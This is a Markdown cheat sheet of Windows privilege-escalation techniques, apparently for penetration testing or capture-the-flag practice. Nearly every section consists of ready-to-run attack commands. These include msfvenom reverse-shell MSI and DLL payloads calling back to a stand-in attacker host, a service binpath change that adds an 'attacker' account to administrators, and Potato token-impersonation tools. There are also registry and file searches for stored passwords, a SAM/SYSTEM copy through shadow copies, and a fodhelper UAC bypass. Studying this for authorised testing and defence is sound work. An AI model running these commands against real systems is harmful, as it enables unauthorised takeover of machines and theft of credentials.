# Windows Privilege Escalation

## Goal

Escalate from a low-privileged user to `NT AUTHORITY\SYSTEM` or a local/domain Administrator.

---

## Enumeration First

### Automated Tools
```powershell
# WinPEAS (most comprehensive)
winpeas.exe
winpeas.bat

# PowerUp (PowerShell)
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
Seatbelt.exe -group=all

# Sherlock (check for unpatched vulnerabilities)
Import-Module .\Sherlock.ps1
Find-AllVulns
```

---

## System Information

```powershell
# Basic info
systeminfo
hostname
whoami /all
net user
net localgroup administrators

# OS and patch level
wmic os get Caption,Version,BuildNumber
wmic qfe list brief   # List installed patches (KBs)

# Running processes
tasklist
Get-Process

# Installed software
wmic product get name,version
Get-ItemProperty HKLM:\Software\*\*\Uninstall\* | Select-Object DisplayName, DisplayVersion
```

---

## Service Misconfigurations

### Unquoted Service Paths

If a service binary path has spaces and is unquoted, Windows searches for the binary in multiple locations:
```
C:\Program Files\My App\service.exe
→ Windows tries: C:\Program.exe, C:\Program Files\My.exe, then the actual path
```

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows" | findstr /i /v '"'

# PowerUp
Get-ServiceUnquoted
```

**Exploit:** Place a malicious executable at the first matching path (if writable).

---

### Weak Service Binary Permissions

If you can overwrite the service binary, replace it with a malicious one.

```powershell
# PowerUp
Get-ModifiableServiceFile

# Manual check — can we write to service binary?
icacls "C:\Path\To\service.exe"

# sc.exe — check service config
sc qc <servicename>
```

**Exploit:**
```powershell
# Replace binary with one that adds user to admins
# Then restart service (if you have permission)
sc stop <servicename>
sc start <servicename>

# Or if SeShutdownPrivilege: restart system
shutdown /r /t 0
```

---

### Weak Service Permissions

If you can modify the service configuration itself:
```powershell
# PowerUp
Get-ModifiableService

# Exploit: Change binary path
sc config <servicename> binpath= "C:\Windows\System32\cmd.exe /c net localgroup administrators attacker /add"
sc stop <servicename>
sc start <servicename>
```

---

## AlwaysInstallElevated

If this registry key is set to 1 in both locations, MSI installers always run as SYSTEM.

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Exploit:**
```bash
# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi -o evil.msi

# Install on target
msiexec /quiet /qn /i evil.msi
```

---

## Token Impersonation

### Checking Privileges
```powershell
whoami /priv
```

| Privilege | Abuse |
|---|---|
| `SeImpersonatePrivilege` | Potato attacks |
| `SeAssignPrimaryTokenPrivilege` | Potato attacks |
| `SeBackupPrivilege` | Read any file (dump SAM/SYSTEM) |
| `SeRestorePrivilege` | Write any file |
| `SeTakeOwnershipPrivilege` | Take ownership of any object |
| `SeDebugPrivilege` | Debug/inject into other processes |
| `SeLoadDriverPrivilege` | Load kernel drivers |

### Potato Attacks (SeImpersonatePrivilege)
Used when running as service accounts (IIS, SQL Server, etc.)

```powershell
# JuicyPotato (older systems)
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t *

# PrintSpoofer (Windows 10 / Server 2019+)
PrintSpoofer.exe -c "cmd /c whoami"
PrintSpoofer.exe -i -c cmd

# GodPotato (modern, works on most Windows versions)
GodPotato.exe -cmd "cmd /c whoami"
```

---

## Credential Hunting

```powershell
# Search for password strings in files
findstr /si password *.txt *.ini *.config *.xml
Get-ChildItem -Recurse | Select-String -Pattern "password" -List

# Windows Credential Manager
cmdkey /list

# Stored credentials
C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
C:\Windows\System32\config\SAM   # Requires SYSTEM

# Registry searches
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# VNC passwords
reg query HKCU\Software\ORL\WinVNC3\Password

# Unattend/Sysprep files (plaintext or base64)
C:\Windows\Panther\unattend.xml
C:\Windows\system32\sysprep\sysprep.xml
```

---

## SAM / NTDS.dit Dump

```powershell
# Volume Shadow Copy trick (copy locked files)
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# Crack hashes offline
# secretsdump.py -sam SAM -system SYSTEM LOCAL
```

---

## Scheduled Tasks

```powershell
# View all scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask

# If task runs a script you can modify:
schtasks /query /fo LIST /v | findstr "Task To Run"
icacls <task_script_path>
```

---

## DLL Hijacking

Applications load DLLs from predictable locations. If you can place a malicious DLL in a directory searched before the legitimate one:

**DLL Search Order:**
1. Application directory
2. System32
3. 16-bit system directory
4. Windows directory
5. Current directory
6. PATH directories

```powershell
# Find missing DLLs with Process Monitor (Procmon)
# Filter: Result = NAME NOT FOUND, Path ends with .dll

# Generate malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f dll -o evil.dll
```

---

## UAC Bypass

If you're a local admin but in medium integrity, bypass UAC to get high integrity:

```powershell
# fodhelper.exe bypass (Windows 10)
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name "(default)" -Value "cmd /c start cmd.exe" -Force
Start-Process fodhelper.exe

# Or use UACME (collection of UAC bypass techniques)
# https://github.com/hfiref0x/UACME
```

---

## Quick Checklist

- [ ] `whoami /priv` — check for impersonation/backup privs
- [ ] `sudo -l` equivalent: `net user <user>`, check groups
- [ ] AlwaysInstallElevated registry keys
- [ ] Unquoted service paths
- [ ] Weak service binary permissions
- [ ] Writable scheduled task scripts
- [ ] AutoLogon credentials in registry
- [ ] Unattend.xml / Sysprep files
- [ ] SAM/SYSTEM via VSS
- [ ] Installed software vulnerabilities

---

## References

- [HackTricks Windows PrivEsc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings — Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [GTFOBins for Windows (LOLBAS)](https://lolbas-project.github.io/)
- [TryHackMe — Windows PrivEsc](https://tryhackme.com/room/windows10privesc)
